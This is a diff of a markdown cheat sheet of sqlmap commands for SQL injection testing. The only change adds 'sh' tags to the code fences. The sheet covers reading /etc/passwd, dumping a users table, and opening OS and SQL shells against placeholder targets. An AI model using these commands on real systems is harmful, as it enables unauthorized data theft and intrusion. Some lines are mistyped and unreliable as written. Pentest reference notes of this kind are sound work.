@@ -11,12 +11,12 @@ Save a request in burp (right click > save to file)
 
 Run with sqlmap 
 
-```
+```sh
 sqlmap -r sqlmap.txt --batch
 ```
 # Generic
 
-```
+```sh
 -u "<URL>" 
 -p "<PARAM TO TEST>" 
 --user-agent=SQLMAP 
@@ -36,7 +36,7 @@ sqlmap -r sqlmap.txt --batch
 
 # Internals
 
-```
+```sh
 --current-user #Get current user
 --is-dba #Check if current user is Admin
 --hostname #Get hostname
@@ -47,37 +47,37 @@ sqlmap -r sqlmap.txt --batch
 
 # Reafile 
 
-```
+```sh
 --file-read=/etc/passwd
 ```
 
 # Specify param to exploit
 
-```
+```sh
 sqlmap -u "http://target_server/param1=value1&param2=value2" -p param1
 ```
 
 # Use POST requests
 
-```
+```sh
 sqlmap -u "http://target_server" --data=param1=value1&param2=value2
 ```
 
 # Access with authenticated session
 
-```
+```sh
 sqlmap -u "http://target_server" --data=param1=value1&param2=value2 -p param1 cookie='my_cookie_value'
 ```
 
 # Basic authentication
 
-```
+```sh
 sqlmap -u !http://target_server! -s-data=param1=value1&param2=value2 -p param1--auth-type=basic --auth-cred=username:password
 ```
 
 # Evaluating response strings
 
-```
+```sh
 sqlmap -u "http://target_server/" --string="This string if query is TRUE"
 
 sqlmap -u "http://target_server/" --not-string="This string if query is FALSE"
@@ -85,37 +85,38 @@ sqlmap -u "http://target_server/" --not-string="This string if query is FALSE"
 
 # List all databases at the site
 
-```
+```sh
 sqlmap -u "http://testsite.com/login.php" --dbs
 ```
 
 # List all tables in a specific database
 
-```
+```sh
 sqlmap -u "http://testsite.com/login.php" -D site_db --tables
 ```
 
 # List all columns in a table
 
-```
+```sh
 sqlmap -u "http://testsite.com/login.php" -D site_db -T users --columns
 ```
 
 # Dump the contents of a DB table
 
-```
+```sh
 sqlmap -u "http://testsite.com/login.php" -D site_db -T users –dump
 ```
 
 # Shell 
 
 Get OS Shell
-```
+
+```sh
 --os-shell
 ```
 
 Get SQL Shell
 
-```
+```sh
 --sql-shell
 ```
